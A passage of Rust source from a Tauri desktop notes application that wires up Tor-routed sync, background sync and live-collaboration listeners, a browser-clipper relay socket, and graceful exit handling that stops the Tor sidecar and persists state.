            let tor_gate = myne_core::plugins::sync::proxy::ProxyGate::new();
            // MYND-650 task 4: publish the gate to the sync transport. The
            // transport is built deep in the engine by `build_transport`, at
            // call sites that have no business knowing what Tor is, so the gate
            // travels by installation rather than by parameter — and because
            // this is the same cell the supervisor writes, the toggle re-routes
            // the next connection without any transport being rebuilt or any
            // endpoint being re-enrolled.
            // A `false` here means setup ran twice in one process: the
            // transport would keep reading the FIRST gate (routing `Direct`)
            // while the toggle and the posture command move the one managed
            // below. Fail-open and invisible, so it is said out loud.
            if !myne_core::plugins::sync::proxy::install(tor_gate.clone()) {
                tracing::error!(event = "tor_gate_already_installed");
                debug_assert!(false, "the sync routing gate was installed twice");
            }
            app.manage(tor_gate.clone());
            let tor_sidecar = std::sync::Arc::new(tor_sidecar::TorSidecar::new(tor_gate.clone()));
            app.manage(tor_sidecar.clone());
            // MYND-650 task 6: restore the device-local `tor_routing_enabled`
            // toggle. A default install has no preference file, so this is a
            // read that finds nothing and starts nothing — the client stays
            // byte-for-byte the direct-sync client it is today. A device that
            // shut down with Tor on comes back up with the gate closed and the
            // sidecar starting, never with a direct connection.
            plugins::sync::tor::restore_at_startup(app.handle(), &tor_gate, tor_sidecar);
            // MYND-424 task 9: the background sync loop (polling-default +
            // coalesced-push, decision B). Unlock-gated; no-op until a vault is
            // Unlocked AND a sync endpoint is configured + the device enrolled.
            // The local-change signal must be managed first (the loop + the
            // notes lifecycle both read it).
            app.manage(plugins::sync::loop_control::SyncLocalChange::default());
            // Window-focus signal for the loop's rate-limited focus poll (the
            // on_window_event handler above bumps it; try_state-None before
            // this manage would have been a safe no-op).
            app.manage(plugins::sync::loop_control::SyncFocusSignal::default());
            // The live sync-status overlay cell (SYNC-36) the loop + sync_now
            // publish Syncing/Error into and sync_status reads back. Without this
            // the producers are `try_state`-None no-ops (the real states never
            // light up on desktop).
            app.manage(plugins::sync::commands::SyncRuntimeStatusCell::default());
            plugins::sync::loop_control::spawn_sync_loop(app.handle().clone());
            // The /sync/poke SSE listener (MYND-423 client half): a push on
            // another device becomes a pull here within seconds — baseline
            // behaviour per the amended sync-protocol §8.3 (no user toggle;
            // polling stays the fallback cadence). The supervisor gates the
            // stream on unlocked+enrolled and parks on a revoked token.
            app.manage(plugins::sync::poke_listener::SsePokeSignal::default());
            plugins::sync::poke_listener::spawn_poke_supervisor(app.handle().clone());
            // Live-awareness stream (live-collab): a SIBLING of the poke supervisor
            // (`SYNC-32`), same unlocked+foregrounded gate (`SYNC-30`), carrying
            // opaque awareness frames the relay cannot read. RAM-only sink; the
            // frame crypto and the coalesced up-POST live in their own layers.
            app.manage(plugins::sync::awareness_listener::AwarenessSignal::default());
            plugins::sync::awareness_listener::spawn_awareness_supervisor(app.handle().clone());
            // Live co-editing sessions (live-collab, `collab-editor-bridge`): the
            // per-device registry of open notes' Automerge documents. Holds
            // decrypted note plaintext, so `DesktopHooks::live_session_teardown_on_lock`
            // clears it on every vault-leaving hook (`SYNC-33` single writer).
            app.manage(myne_core::plugins::live::LiveSessionRegistry::default());
            // ext-foundation-handoff task 6: the host↔app relay listener. Binds
            // the owner-only (0600) Unix-domain-socket under the app-data dir
            // and serves the keyless clip ingest on a background thread. The
            // browser-launched native-messaging host (a SEPARATE OS process)
            // connects to this socket and forwards frames; the app
            // re-validates every forwarded frame as untrusted input
            // (`clipper::ingest`) before composing the note + calling the
            // EXISTING `note_create`. Unix-only here; the Windows named-pipe arm
            // is a documented seam (`clipper::relay`).
            #[cfg(unix)]
            clipper::relay_app::spawn_relay_listener(app.handle().clone());
            // Register the browser native-messaging host manifest so the keyless
            // clipper extension can launch this host with no hand-created file.
            // Idempotent + best-effort + non-fatal (same discipline as the relay
            // bind + boot migration above): honors the opt-in flag (default on),
            // writes/refreshes for every installed browser, removes when disabled.
            // A no-op on Windows today (registry registration is a fast-follow).
            if let Ok(base) = app.path().app_data_dir() {
                clipper::install::reconcile_from_flag(&base);
            }
            // MYND-486: the custom-theme palettes moved from device-local
            // plaintext files (`app_config_dir/themes/<name>.json`) into the
            // encrypted `vault.themes` (`MYT1`) blob. Pre-alpha means NO
            // migration (`decisions.md` 2026-07-16) — the old directory is just
            // stale plaintext, so remove it best-effort. Tolerant of absence
            // (an `Err` when the dir never existed is the common case) and
            // deliberately NOT a read+migrate: the decision was to drop, not
            // carry forward. Never touches vault content (a different tree).
            if let Ok(config_dir) = app.path().app_config_dir() {
                let _ = std::fs::remove_dir_all(config_dir.join("themes"));
            }
            // myne-md/myne#788: the FIRST-launch argv ingress for the
            // plain-file editor. The second-launch path is the single-instance
            // callback below; this covers a cold start from a file association
            // on Windows/Linux and the E2E's argv launch. Silent while the gate
            // is off, by design. The file is also held for the frontend to
            // claim (`plain_file_take_unclaimed`), because this runs before the
            // WebView could have attached its listener.
            plugins::plain_file::ingest::ingest_args(app.handle(), std::env::args().collect());
            Ok(())
        })
        .build(tauri::generate_context!())
        .expect("error while building tauri application")
        .run(|app_handle, event| {
            // MYND-29 Task 7: best-effort search-index flush on app exit so
            // the next unlock takes the fast path. Reconcile-on-unlock makes a
            // missed flush non-fatal (the next unlock re-indexes the
            // since-last-flush delta), so any failure here is swallowed. The
            // brief `block_on` is acceptable on the exit path (the run
            // callback is the main event-loop thread, not a tokio worker).
            // macOS: clicking the dock icon (or File → New Window) while the app
            // has no visible window fires `Reopen`, NOT the single-instance
            // callback (no new process is spawned). After auto-lock on idle hides
            // the window (`auto_lock::hide_window` → `orderOut`), this is the only
            // path that brings the (locked) unlock screen back. Without it the
            // window stays hidden and the app looks frozen in the dock.
            //
            // myne-md/myne#483: this used to say protection was "already
            // re-applied at the lock site, so no plaintext is re-exposed". The
            // lock site re-applies while the window is HIDDEN, and a hide/show
            // cycle is exactly where the Windows affinity is reported to be
            // lost. So the lock-site call is not a substitute for one here.
            #[cfg(target_os = "macos")]
            if let tauri::RunEvent::Reopen { .. } = event {
                screen_capture::show_protected(app_handle, "macos_reopen");
            }
            // myne-md/myne#788: macOS delivers a file open (Finder, `open -a`,
            // drag onto the Dock icon) as an Apple Event, not as argv. Two
            // shapes reach here: a cold launch (where the setup-time ingest
            // above has already run and this URL list is the real delivery) and
            // a warm app. `ingest_urls` is gate-checked and first-match-wins,
            // so a duplicate delivery collapses onto the same handle.
            #[cfg(any(target_os = "macos", target_os = "ios", target_os = "android"))]
            if let tauri::RunEvent::Opened { urls } = &event {
                plugins::plain_file::ingest::ingest_urls(app_handle, urls.clone());
            }
            // MYND-650 task 2: terminate the arti sidecar before the process
            // goes away. A Tor client left holding circuits open after the app
            // is gone is both a resource leak and a signal that Myne was
            // running, so this fires on BOTH exit events — `ExitRequested` is
            // skipped when the platform tears the app down directly, and
            // `stop()` is idempotent. `Drop` on the managed state and (on
            // Linux) `PR_SET_PDEATHSIG` are the two backstops beneath this one.
            if matches!(
                event,
                tauri::RunEvent::ExitRequested { .. } | tauri::RunEvent::Exit
            ) {
                use tauri::Manager;
                if let Some(sidecar) =
                    app_handle.try_state::<std::sync::Arc<tor_sidecar::TorSidecar>>()
                {
                    sidecar.stop();
                }
            }
            if let tauri::RunEvent::ExitRequested { .. } = event {
                use tauri::Manager;
                if let Some(state) =
                    app_handle.try_state::<plugins::vault_unlock::state::VaultRuntimeState>()
                {
                    let app = app_handle.clone();
                    tauri::async_runtime::block_on(async move {
                        // Best-effort graceful-exit persist, bounded by a hard
                        // timeout. `block_on` runs on the main event-loop thread
                        // and cannot be preempted, so a wedged persist (e.g. a
                        // slots RwLock held by an in-flight lock/idle-lock task,
                        // or slow disk) would otherwise stall the exit forever —
                        // the window is already gone but `ControlFlow::Exit` is
                        // never reached, leaving a zombie process. On Windows the
                        // title-bar X is the only quit affordance, so that reads
                        // as "the app won't close". On timeout we drop the
                        // persist and let the app exit (the periodic coalesced
                        // flush already bounds layout loss to ~5 min).
                        let persist = async {
                            plugins::notes::search_sync::persist_search_index(&app, state.inner())
                                .await;
                            // MYND-166: flush the staged editor workspace
                            // descriptor to vault.workspace. Cmd+Q / app-menu
                            // Quit fire only ExitRequested (not the window's
                            // onCloseRequested), so this is the layout's persist
                            // path on app quit.
                            plugins::workspace::commands::persist_workspace_on_exit(
                                &app,
                                state.inner(),
                            )
                            .await;
                        };
                        if tokio::time::timeout(std::time::Duration::from_secs(5), persist)
                            .await
                            .is_err()
                        {
                            tracing::warn!(event = "exit_persist_timed_out");
                        }
                    });
                }
            }
        });
}
